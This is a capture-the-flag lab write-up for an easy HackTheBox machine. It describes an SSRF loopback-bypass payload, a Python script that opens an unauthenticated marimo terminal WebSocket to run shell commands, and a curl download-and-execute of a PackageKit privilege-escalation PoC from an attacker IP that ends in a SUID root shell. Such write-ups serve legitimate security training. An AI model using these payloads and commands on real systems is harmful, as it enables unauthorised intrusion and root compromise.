# Machine: Cohort

Date: 05-08-2026
Platform: HTB
Difficulty: Easy
Author: WhoKn0ws

---

## Recon

### Nmap:

```bash
nmap -sC -sV $MACHINE_IP
```

**Results:**

- Port 22 → SSH (OpenSSH)
- Port 80 → HTTP (nginx) — redirects to HTTPS
- Port 443 → HTTPS (nginx) — serves the marketing SPA + `/api/*` routes

**Full port scan:**

Not shown in original notes — only 22/80/443 were relevant to the attack path.

**Notes:**

- TLS SAN includes `cohort.htb` and `*.cohort.htb` — wildcard cert signals subdomain enumeration may be relevant
- Frontend JS is obfuscated/AES-wrapped; the important client-side call is `fetch("/api/validate", {url, format})`
- VPN note: if HTTPS hangs or resets, lower tunnel MTU (`sudo ip link set tun0 mtu 1200`)
- Added to /etc/hosts: `$MACHINE_IP cohort.htb`

---

## Enumeration

### API behavior analysis:

The marketing SPA posts feed URLs to `POST /api/validate`. This endpoint is an SSRF primitive with a weak loopback denylist — `127.0.0.1` and `localhost` are blocked, but `127.1`, `0.0.0.0`, and other alternate loopback encodings are not.

```bash
curl -sk https://cohort.htb/api/validate \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://127.1/status","format":"json"}'
```

**Findings:**

Response JSON exposes internal upstreams behind the same nginx:

```json
{
  "upstreams": [
    {"name": "marketing", "host": "cohort.htb"},
    {"name": "insights-api", "path": "/api/", "target": "127.0.0.1:5000"},
    {
      "name": "notebooks",
      "host": "nb-1be3782a8afd3ad5.cohort.htb",
      "target": "127.0.0.1:8888",
      "note": "internal analyst workspace, not for external use"
    }
  ]
}
```

- `insights-api` — internal API on `:5000`, not explored further (not needed for the chain)
- `notebooks` — internal analyst workspace on `:8888`, only reachable via the hashed vhost `nb-<hex>.cohort.htb` — not published on the external IP directly

```bash
echo "$MACHINE_IP nb-1be3782a8afd3ad5.cohort.htb" | sudo tee -a /etc/hosts
```

---

## Exploitation

### CVE-2026-39987 — marimo unauthenticated WebSocket PTY

The notebooks vhost runs **marimo 0.20.4**, which exposes an unauthenticated terminal WebSocket at `/terminal/ws`. Public PoCs assuming a JSON "exec" protocol don't work against this build — the socket is a raw PTY: send shell text directly, read the ANSI-ish output back.

**Steps:**

**1. Connect to the notebooks WebSocket and send a command:**

```bash
python3 - <<'PY'
import asyncio, ssl, websockets
ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
async def main():
    async with websockets.connect(
        "wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws", ssl=ctx
    ) as ws:
        try: print(await asyncio.wait_for(ws.recv(), timeout=3))
        except asyncio.TimeoutError: pass
        await ws.send("id; cat /home/marimo/user.txt\n")
        print(await asyncio.wait_for(ws.recv(), timeout=10))
asyncio.run(main())
PY
```

> Marimo's systemd unit also embeds an access token, but it's unnecessary once the WebSocket is open — the endpoint itself is unauthenticated.

**Result:** Shell as `marimo` (login shell is `/usr/sbin/nologin`, so SSH password auth to this user isn't useful — the WebSocket PTY is the only path in). `user.txt` read successfully.

---

## Privilege Escalation

### Enumeration:

The box runs PackageKit **1.2.8**, which is vulnerable to a known chain nicknamed **Pack2TheRoot (CVE-2026-41651)**.

**Findings:**

- PackageKit 1.2.8 present — affected by Pack2TheRoot (versions before 1.3.5)
- `/etc/modprobe.d/disable-algif_aead.conf` blocks the unrelated Copy Fail / Dirty Frag path (`CVE-2026-31431`) — confirmed dead end, not the intended route

### CVE-2026-41651 — Pack2TheRoot (PackageKit TOCTOU)

Pack2TheRoot chains three bugs in PackageKit's `pk-transaction.c`:

1. `InstallFiles()` unconditionally overwrites cached flags/paths.
2. Backward state transitions are silently dropped.
3. `pk_transaction_run()` reads flags at dispatch time (GLib idle), not at auth time.

The attack flow: call `InstallFiles(SIMULATE, dummy)` to skip polkit auth and move state to READY, then fire a second async `InstallFiles(NONE, payload.deb)` that overwrites the paths while state stays READY. The idle-time install then runs the payload `.deb` as root, and its postinst script sets the SUID bit on a dropped binary.

```bash
# from attacker machine (VPN IP), serve the PoC binary
python3 -m http.server 8889 --bind 10.10.16.5

# from the marimo PTY shell:
curl -fsSL http://10.10.16.5:8889/pack2theroot -o /tmp/pack2theroot
chmod +x /tmp/pack2theroot && /tmp/pack2theroot
/tmp/.suid_bash -p -c 'cat /root/root.txt'
```

**Successful escalation:** root ✓ — Pack2TheRoot drops a SUID bash at `/tmp/.suid_bash`, which is invoked with `-p` to preserve root privileges.

---

## Loot / Flags

- **user.txt:** `[FLAG REDACTED]` → `/home/marimo/user.txt`
- **root.txt:** `[FLAG REDACTED]` → `/root/root.txt`

---

## Lessons Learned

- SSRF denylist bypass: always try alternate loopback forms (`127.1`, `0`, `0.0.0.0`, IPv6, decimal/octal IP encodings) before assuming "localhost blocked" means no SSRF is possible
- Internal status pages (`/status`, stub_status, custom JSON endpoints) are high-value SSRF targets — they often leak internal hostnames that the same wildcard TLS cert and nginx config already serve
- Marimo/Jupyter-class notebook apps should always be checked for unauthenticated terminal or kernel WebSockets, even when the UI itself prompts for a token
- Don't assume public PoCs match the exact protocol a service speaks — the marimo WS here was a raw PTY, not the JSON "exec" protocol most public exploits expect; always verify by inspecting raw responses first
- Recent PackageKit LPEs (Pack2TheRoot and similar) are worth testing whenever `pkcon`/`packagekitd` is present and below the patched version — often faster than hunting for kernel-level privesc paths, which labs frequently patch/blacklist anyway
- Rule out dead ends explicitly and document why (e.g. a blocked kernel module here) — it saves the next person from repeating a wasted path
